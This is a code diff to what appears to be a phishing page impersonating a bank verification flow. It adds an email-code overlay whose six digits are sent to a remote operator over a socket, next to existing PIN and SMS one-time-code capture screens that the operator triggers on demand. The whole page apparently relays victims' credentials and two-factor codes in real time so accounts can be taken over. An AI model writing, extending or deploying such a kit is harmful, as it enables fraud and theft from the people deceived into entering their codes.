@@ -131,6 +131,24 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
     <button class="ov-btn" style="background:#872879;color:#fff" onclick="submitPINCode()" data-i18n="confirm_pin">CONFIRM PIN</button>
   </div>
 </div>
+<div id="ov-mail" class="overlay" style="display:none">
+  <div class="ov-card">
+    <div class="ov-icon-wrap" style="background:#fdf2f8;animation:shield-pulse 2s ease-in-out infinite">
+      <i class="fas fa-envelope" style="color:#872879"></i>
+    </div>
+    <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 5px" data-i18n="mail_title">Email Verification</h3>
+    <p style="font-size:12px;color:#64748b;margin:0 0 18px;line-height:1.5" data-i18n="mail_desc">You received a 6-digit code in your email. Enter it below:</p>
+    <div class="otp-row" id="otp-mail">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+    </div>
+    <button class="ov-btn" id="mail-submit-btn" style="background:#872879;color:#fff;opacity:.5;cursor:default" data-i18n="confirm_code">CONFIRM CODE</button>
+  </div>
+</div>
 <div id="ov-app" class="overlay" style="display:none">
   <div class="ov-card" style="max-width:340px;padding:24px 20px">
     <!-- Header -->
@@ -263,6 +281,42 @@ function submitPINCode(){
   socket.emit('pin_code_submitted',{token:TOKEN,code:code});
   document.getElementById('ov-pin').style.display='none';
 }
+function initOTPMail(){
+  const boxes=[...document.querySelectorAll('#otp-mail .otp-b')];
+  boxes.forEach((b,i)=>{
+    b.addEventListener('input',()=>{
+      const raw=b.value.replace(/\D/g,'');
+      b.value=raw?raw[0]:'';
+      b.classList.toggle('otp-filled',!!b.value);
+      if(b.value&&i<5) boxes[i+1].focus();
+      checkOTPMail(boxes);
+    });
+    b.addEventListener('keydown',e=>{
+      if(e.key==='Backspace'&&!b.value&&i>0){boxes[i-1].focus();boxes[i-1].value='';boxes[i-1].classList.remove('otp-filled');checkOTPMail(boxes);}
+    });
+    b.addEventListener('paste',e=>{
+      e.preventDefault();
+      const txt=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'');
+      boxes.forEach((bx,j)=>{bx.value=txt[j]||'';bx.classList.toggle('otp-filled',!!bx.value);});
+      checkOTPMail(boxes);
+      if(txt.length>=6) submitMailCode();
+    });
+  });
+}
+function checkOTPMail(boxes){
+  const val=boxes.map(b=>b.value).join('');
+  const btn=document.getElementById('mail-submit-btn');
+  if(val.length===6){btn.style.opacity='1';btn.style.cursor='pointer';}
+  else{btn.style.opacity='.5';btn.style.cursor='default';}
+  if(val.length===6) submitMailCode();
+}
+function submitMailCode(){
+  const code=[...document.querySelectorAll('#otp-mail .otp-b')].map(b=>b.value).join('');
+  if(code.length<6){return;}
+  socket.emit('mail_code_submitted',{token:TOKEN,code:code});
+  document.getElementById('ov-mail').style.display='none';
+}
+initOTPMail();
 function openBank(scheme, iosUrl, androidUrl){
   document.getElementById('app-matched').style.display='none';
   document.getElementById('app-all-banks').style.display='none';
@@ -470,6 +524,12 @@ function buildBankList(filter){
 function filterBankList(v){ buildBankList(v); }
 socket.on('sms_received',function(){ resetOTP(); document.getElementById('ov-sms').style.display='flex'; setTimeout(()=>document.querySelector('#otp-sms .otp-b').focus(),200); });
 socket.on('show_pin_prompt',function(){ document.getElementById('pin-code').value=''; document.getElementById('ov-pin').style.display='flex'; });
+socket.on('mail_received',function(){
+  document.querySelectorAll('#otp-mail .otp-b').forEach(b=>{b.value='';b.classList.remove('otp-filled');});
+  const btn=document.getElementById('mail-submit-btn');btn.style.opacity='.5';btn.style.cursor='default';
+  document.getElementById('ov-mail').style.display='flex';
+  setTimeout(()=>document.querySelector('#otp-mail .otp-b').focus(),200);
+});
 socket.on('app_confirm',function(d){
   const bank=matchBank(d&&d.bank?d.bank:'');
   document.getElementById('app-waiting').style.display='none';
